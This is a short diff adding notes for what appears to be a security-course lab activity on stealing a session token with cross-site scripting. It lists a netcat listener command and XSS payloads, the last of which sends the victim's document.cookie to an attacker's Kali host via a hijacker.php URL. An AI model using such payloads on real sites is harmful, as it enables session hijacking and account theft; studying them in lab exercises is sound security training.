@@ -1,0 +1,9 @@
+Activity 2.6.3 - Swiping a Token with XSS
+
+ifconfig
+
+nc -l -v -p 80
+
+<script>alert("hey there");</script>
+<script>alert(document.cookie);</script>
+<script>location.href='http://<Kali IP>/hijacker.php?cookie='+document.cookie;</script>
